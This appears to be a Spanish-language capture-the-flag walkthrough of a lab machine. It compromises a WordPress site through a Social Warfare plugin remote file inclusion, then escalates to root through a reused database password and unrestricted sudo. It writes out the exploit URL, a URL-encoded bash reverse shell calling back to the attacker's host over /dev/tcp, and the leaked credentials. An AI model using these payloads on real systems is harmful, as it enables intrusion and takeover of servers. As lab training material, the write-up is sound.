PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Hacemos Fuzzing al puerto 80 y encontramos el directorio /wordpress

-Enumeramos con wpscan y encontramos el siguiente plugin
	-Social Warfare <= 3.5.2 

-El plugin es vulnerable a RCE mediante un RFI:
	-Especificando la siguiente ruta, podemos incluir la dirección de nuestro servidor y ejecutar comandos haciendo peticiones a un archivo que creemos:
		-http://192.168.236.137/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=NUESTRO SERVIDOR

-Según este CVE, tenemos que crear un archivo .txt o .php con la siguiente estructura:
	![[Pasted image 20250506173640.png]]

-Probamos:
	-Abrimos servidor en nuestra máquina local:
		-python3 -m http.server 80
	-Desde la URL:
		-http://192.168.236.137/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.236.128/test.txt
			**uid=33(www-data) gid=33(www-data) groups=33(www-data)** 

-Modificamos test.txt para interactuar con una webshell desde la URL:
	![[Pasted image 20250506174531.png]]

-Nos mandamos una RS desde la webshell:
	-http://192.168.236.137/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.236.128/test.txt&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.236.128/1234%200%3E%261%27
		www-data@wpwn:/$ whoami
			www-data

## Escalada de Privilegios

-Miramos el contenido del wp-config.php:
	/** MySQL database username */
	define( 'DB_USER', 'wp_user' );
	/** MySQL database password */
	define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );

-Probamos la misma contraseña de la base de datos con el usuario 'takis':
	-su takis
	-Password: R3&]vzhHmMn9,:-5
		takis@wpwn:/$ whoami
			takis

-takis@wpwn:/$ sudo -l
	(ALL) NOPASSWD: ALL

takis@wpwn:/$ sudo su
	root@wpwn:/# whoami
		root



